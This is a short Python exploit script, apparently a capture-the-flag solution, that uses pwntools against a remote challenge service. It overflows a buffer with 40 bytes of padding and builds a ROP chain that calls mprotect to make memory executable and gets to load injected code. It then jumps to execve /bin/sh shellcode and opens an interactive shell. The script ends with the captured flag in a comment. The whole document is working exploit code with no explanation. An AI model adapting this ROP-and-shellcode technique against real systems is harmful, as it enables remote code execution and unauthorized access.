from pwn import *

context.update(arch='amd64', os='linux')

p = remote('103.157.96.13', 7783)
#p = process('./chal18')
p.recvuntil("Input : ")

#ROP
pop_rdi = 0x401846
pop_rsi = 0x4077ce
pop_rdx = 0x40175b

#alamat
gets = 0x40fd80
mprotect = 0x446ad0
freechar = 0x4b25f0
heap = 0x4b0000
hsize = 0x23000
perms = 7
shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

payload = "A" * 40

#call mprotect
payload+=p64(pop_rdi) + p64(heap) + p64(pop_rsi) + p64(hsize) + p64(pop_rdx) + p64(perms) + p64(mprotect)

# call gets
payload+=p64(pop_rdi) + p64(freechar) + p64(gets)

# set rip to freechar
payload+=p64(freechar) 

p.sendline(payload)
p.sendline(shellcode)
p.interactive()

#CTFR{wh3n_y0u_d035nt_f1nd_4ny_5h3ll_d00r_w3ll_u51n9_3x3cv_t0_sp4wn_1t}